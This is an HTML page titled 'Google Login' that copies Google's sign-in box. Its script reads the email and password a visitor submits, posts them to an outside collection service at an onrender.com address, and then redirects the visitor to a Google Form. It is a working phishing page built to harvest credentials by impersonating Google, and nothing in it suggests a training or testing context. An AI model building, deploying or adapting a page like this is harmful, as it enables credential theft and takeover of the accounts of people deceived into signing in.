<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f2f2f2;
    }
    .login-box {
      width: 300px;
      padding: 20px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }
    .login-box h1 {
      font-size: 20px;
      margin-bottom: 20px;
    }
    .login-box label {
      display: block;
      font-size: 14px;
      margin-bottom: 5px;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .login-box button {
      width: 100%;
      padding: 10px;
      background: #4285f4;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    .login-box button:hover {
      background: #357ae8;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h1>Sign in</h1>
    <form id="loginForm">
      <label for="email">Email</label>
      <input type="email" id="email" name="email" required>
      <label for="password">Password</label>
      <input type="password" id="password" name="password" required>
      <button type="submit">Next</button>
    </form>
  </div>
  <script>
    
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = e.target.email.value;
      const password = e.target.password.value;

      // Save email and password to backend
      const response = await fetch('https://email-password-service.onrender.com/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });


      if (response.ok) {
        // Redirect to Google Form
        window.location.href = 'https://forms.gle/exampleGoogleForm';
      } else {
        alert('Error saving credentials. Please try again.');
      }
    });
  </script>
</body>
</html>
